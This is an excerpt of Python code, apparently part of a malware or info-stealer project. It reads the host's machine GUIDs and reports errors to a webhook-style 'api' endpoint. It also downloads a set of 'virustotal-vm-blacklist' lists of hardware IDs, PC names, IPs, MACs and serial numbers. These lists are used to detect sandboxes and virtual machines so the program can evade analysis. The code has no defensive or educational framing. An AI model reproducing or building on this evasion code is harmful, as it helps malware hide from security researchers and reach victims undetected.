...
def get_guid():
    try:
        ...
        print(e)
        requests.post(f'{api}', json={'content': f"**ERROR - (Get_Guid)** `{e}`"})
        pass
...
def get_hwguid():
    try:
        ...
        print(e)
        requests.post(f'{api}', json={'content': f"**ERROR - (Get_HWGuid)** `{e}`"})
        pass
...
hwidlist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/pc_platforms.txt')
bios_serial_list = requests.get(
    'https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
baseboardmanufacturerlist = requests.get(
    'https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
baseboardserial_list = requests.get(
    'https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
cpuserial_list = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
diskdriveserial_list = requests.get(
    'https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
hwprofileguidlist = requests.get(
    'https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')
machineguidlist = requests.get('https://raw.githubusercontent.com/HR1738Gz/virustotal-vm-blacklist/main/MachineGuid.txt')
